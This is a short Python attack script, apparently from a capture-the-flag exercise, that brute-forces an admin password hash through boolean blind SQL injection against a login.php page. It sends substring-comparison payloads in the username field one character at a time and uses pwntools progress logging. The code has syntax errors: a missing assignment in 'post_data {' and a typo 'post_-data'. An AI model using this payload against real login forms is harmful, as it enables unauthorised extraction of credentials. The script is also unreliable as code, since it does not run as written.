````python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, pdb, signal, string

def def_handler(sig, frame):
    print("\n\n[!] saliendo...\n")

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


# variables globales
login_url = "http://10.10.xx.xx/login.php"
characters = string.digits + "abcdef"

def makeSQLI():

    p1 = log.progress("SQLI")
    p1.status("iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("password")

    password = ""

    for position in range(1, 50):
        for character in characters:

            post_data {
                'username': "admin' and substring(password,%d,1)='%s'-- -" % (position, character),
                'password': 'test'
            }

            p1.status(post_data['username'])

            r =requests.post(login_url, data=post_-data)

            if "Try again.." not in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeSQLI()
    ````
    